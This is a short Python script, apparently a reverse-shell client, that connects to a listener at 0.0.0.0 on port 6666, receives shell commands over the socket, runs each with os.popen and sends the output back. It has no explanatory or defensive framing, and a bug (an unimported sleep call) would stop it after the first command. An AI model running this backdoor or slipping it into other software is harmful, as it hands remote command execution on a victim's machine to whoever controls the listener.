#! /usr/bin/python3
#-*- encoding: utf-8 -*-
#Auther: kiyotaka
#Time: 2021/9/12

import socket
import os
import sys
import time

def client():
    try:
        clie = socket.socket()
        clie.connect(("0.0.0.0", 6666))

    except socket.error as e:
        sys.exit(1)

    while True:
        cmd = clie.recv(1024).decode()
        if cmd == "exit":
            clie.close()
            sys.exit(1)

        else:
            with os.popen(cmd, "r") as f:
                ret = f.read()
                sleep(1)
                f.close()

                if ret:
                    clie.send(ret.encode())

                else:
                    clie.send("ret = NONE".encode())

if __name__ == "__main__":
    client()
